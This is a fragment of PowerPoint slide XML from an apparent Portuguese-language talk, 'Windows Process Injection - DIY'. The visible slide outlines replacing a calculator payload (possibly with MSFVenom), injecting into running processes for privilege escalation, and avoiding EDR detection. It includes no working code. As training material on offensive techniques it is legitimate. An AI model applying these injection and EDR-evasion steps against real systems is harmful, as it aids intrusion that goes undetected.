              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0" err="1"/>
              <a:t>Payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t> (substituir a calculadora)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="1" indent="-457200">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2000" dirty="0" err="1"/>
              <a:t>MSFVenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2000" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="2000" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-BR" b="1" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t>2. Injetar em processos já em execução</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="2400" b="1" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t>	a. Mesmo usuário</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" dirty="0"/>
              <a:t>	b. Usuário com mais privilégios = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" dirty="0" err="1"/>
              <a:t>privesc</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="pt-BR" b="1" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="pt-BR" sz="2400" noProof="0" dirty="0"/>
              <a:t>3. Realizar a injeção sem ser percebido pelo EDR</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="242271978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DE6B7-EF66-9CD2-A501-AB3F24A5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CE40DC-5723-449B-A365-A61D8C262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16239E-F23B-202C-4339-41603BD32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5708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854DBCA-D3C3-4C19-9B2E-DFA0BE647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1383CB6-8BE5-4911-970B-A4151A07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16525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42D14D1-56B7-40CD-8694-A9A48170C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17801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50A315C-978A-4A52-966E-55B2698F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17801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4F57FBD-B5E8-10D7-3172-A9350436C984}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3943044" y="2978727"/>
            <a:ext cx="5097042" cy="117070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8000" b="1" dirty="0"/>
              <a:t>PERGUNTAS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8000" b="1" noProof="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20013579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87893</TotalTime>
  <Words>3397</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>358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Meiryo</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Corbel</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Windows Process Injection - DIY</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Conteúdo</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Comunicação Win32 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Lacerda</dc:creator>
  <cp:lastModifiedBy>Alan</cp:lastModifiedBy>
  <cp:revision>130</cp:revision>
  <cp:lastPrinted>2026-09-26T12:53:38Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-07-15T20:40:22Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-28T18:06:10Z</dcterms:modified>
</cp:coreProperties>
</file>